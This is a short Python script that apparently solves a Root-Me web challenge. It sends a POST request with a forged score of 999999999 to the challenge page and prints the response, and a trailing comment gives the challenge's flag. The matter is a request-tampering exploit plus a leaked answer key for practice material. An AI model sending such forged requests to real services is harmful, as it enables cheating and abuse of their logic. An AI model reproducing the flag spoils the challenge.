import requests

url = 'http://challenge01.root-me.org/web-serveur/ch56/'
r = requests.post(url, data={'score':999999999, 'generate':'Give+a+try!'})
print(r.text)
#H7tp_h4s_N0_s3Cr37S_F0r_y0U